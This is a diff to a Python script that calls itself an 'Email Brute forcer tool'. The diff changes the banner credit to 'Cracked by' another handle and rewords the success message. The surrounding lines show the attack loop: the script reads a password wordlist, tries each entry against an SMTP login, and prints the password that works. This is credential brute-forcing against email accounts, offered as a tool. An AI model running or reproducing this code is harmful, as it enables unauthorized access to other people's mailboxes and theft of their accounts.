@@ -3,7 +3,7 @@ import smtplib
 print("                             ")
 print("\t#################################################")
 print("\t#         Welcome to Email Brute forcer tool    #")
-print("\t#          Created by @ashujaiswal109           #")
+print("\t#          Cracked by @mynameisrobin          #")
 print("\t#################################################")
 print("                             ")
 
@@ -20,7 +20,7 @@ passwf = open(passwf, "r")
 for password in passwf:
     try:
         smtpserver.login(user, password)
-        print("Voila! password found: %s" % password)
+        print("WOAH! password found: %s" % password)
         print("                                   ")
         break
     except smtplib.SMTPAuthenticationError:
